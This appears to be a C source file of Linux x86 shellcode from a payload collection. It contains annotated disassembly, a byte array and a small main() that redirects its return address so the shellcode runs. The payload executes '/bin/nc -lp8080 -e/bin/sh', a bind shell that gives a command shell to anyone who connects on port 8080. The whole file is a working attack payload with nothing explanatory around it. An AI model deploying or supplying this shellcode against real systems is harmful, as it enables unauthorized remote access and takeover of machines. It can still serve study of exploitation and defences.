/* 08048060 <_start>:
 8048060:       eb 2a                   jmp    804808c <GotoCall>

08048062 <shellcode>:
 8048062:       5e                      pop    %esi
 8048063:       31 c0                   xor    %eax,%eax
 8048065:       88 46 07                mov    %al,0x7(%esi)
 8048068:       88 46 0f                mov    %al,0xf(%esi)
 804806b:       88 46 19                mov    %al,0x19(%esi)
 804806e:       89 76 1a                mov    %esi,0x1a(%esi)
 8048071:       8d 5e 08                lea    0x8(%esi),%ebx
 8048074:       89 5e 1e                mov    %ebx,0x1e(%esi)
 8048077:       8d 5e 10                lea    0x10(%esi),%ebx
 804807a:       89 5e 22                mov    %ebx,0x22(%esi)
 804807d:       89 46 26                mov    %eax,0x26(%esi)
 8048080:       b0 0b                   mov    $0xb,%al
 8048082:       89 f3                   mov    %esi,%ebx
 8048084:       8d 4e 1a                lea    0x1a(%esi),%ecx
 8048087:       8d 56 26                lea    0x26(%esi),%edx
 804808a:       cd 80                   int    $0x80

0804808c <GotoCall>:
 804808c:       e8 d1 ff ff ff          call   8048062 <shellcode>
 8048091:       2f                      das
 8048092:       62 69 6e                bound  %ebp,0x6e(%ecx)
 8048095:       2f                      das
 8048096:       6e                      outsb  %ds:(%esi),(%dx)
 8048097:       63 23                   arpl   %sp,(%ebx)
 8048099:       2d 6c 70 38 30          sub    $0x3038706c,%eax
 804809e:       38 30                   cmp    %dh,(%eax)
 80480a0:       23 2d 65 2f 62 69       and    0x69622f65,%ebp
 80480a6:       6e                      outsb  %ds:(%esi),(%dx)
 80480a7:       2f                      das
 80480a8:       73 68                   jae    8048112 <GotoCall+0x86>
 80480aa:       23 41 41                and    0x41(%ecx),%eax
 80480ad:       41                      inc    %ecx
 80480ae:       41                      inc    %ecx
 80480af:       42                      inc    %edx
 80480b0:       42                      inc    %edx
 80480b1:       42                      inc    %edx
 80480b2:       42                      inc    %edx
 80480b3:       43                      inc    %ebx
 80480b4:       43                      inc    %ebx
 80480b5:       43                      inc    %ebx
 80480b6:       43                      inc    %ebx
 80480b7:       44                      inc    %esp
 80480b8:       44                      inc    %esp
 80480b9:       44                      inc    %esp
 80480ba:       44                      inc    %esp
*/

//bin/nc -lp8080 -e/bin/sh
char shellcode[] =
"\xeb\x2a\x5e\x31\xc0\x88\x46\x07\x88\x46\x0f\x88\x46\x19\x89\x76\x1a\x8d\x5e\x08\x89\x5e\x1e\x8d\x5e\x10\x89\x5e\x22\x89\x46\x26\xb0\x0b\x89\xf3\x8d\x4e\x1a\x8d\x56\x26\xcd\x80\xe8\xd1\xff\xff\xff\x2f\x62\x69\x6e\x2f\x6e\x63\x23\x2d\x6c\x70\x38\x30\x38\x30\x23\x2d\x65\x2f\x62\x69\x6e\x2f\x73\x68\x23";

int main()
{
	int *ret;
	ret = (int *)&ret + 2;
	(*ret) = (int)shellcode;
}